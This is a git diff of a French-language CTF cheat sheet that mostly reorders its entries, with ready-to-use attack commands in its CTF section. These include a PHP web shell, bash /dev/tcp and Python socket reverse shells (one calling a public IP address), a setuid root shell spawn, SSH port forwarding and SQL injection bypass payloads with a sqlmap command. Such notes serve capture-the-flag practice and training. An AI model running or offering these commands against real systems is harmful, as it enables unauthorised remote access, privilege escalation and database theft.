@@ -5,16 +5,14 @@
 ---
 
 ## CTF
-
+	
+- https://www.revshells.com/
+- Par internet --> https://dashboard.ngrok.com/get-started/setup
 - Reverse shell PHP --> [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
 	- `<?php system($_GET["cmd"]) ?>`
    	- `<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");`
         - [Simple-PHP-Web-Shell](https://github.com/artyuum/simple-php-web-shell)
-   	
-- https://www.revshells.com/
-- Par internet --> https://dashboard.ngrok.com/get-started/setup
-
-- [Liste en plusieurs language Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
+        - [Liste en plusieurs language Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
 	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
 	- Spawn a meilleur shell --> `python -c 'import pty;pty.spawn ("/bin/bash")'` ou `python3 -c 'import pty;pty.spawn ("/bin/bash")'`
 	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
@@ -35,7 +33,7 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 - SSH Port Forwording --> `ssh sau@10.10.11.214 -L 8000:127.0.0.1:80` (attaquant --> 8000, victime --> 80)
 
-- WU Mars@Hack --> https://gitlab.com/marshack/writeups/ctf_2024
+- WU CTF Mars@Hack --> https://gitlab.com/marshack/writeups/ctf_2024
 
 ### Tools
 
@@ -52,7 +50,6 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 - `' or 1=1- -` --> Bypass authentification web
 	- [Payload](https://github.com/payloadbox/sql-injection-payload-list)
-	- Mary' union select 1,2,3,4,5,@@version#
 
 - SQLMap --> `sqlmap -u http://192.168.56.109/cgi-bin/badstore.cgi?action=loginregister --dbs --batch searchquery`
   	- Outil automatique SQLMap --> https://github.com/DedSecCyber/DedSecSQL
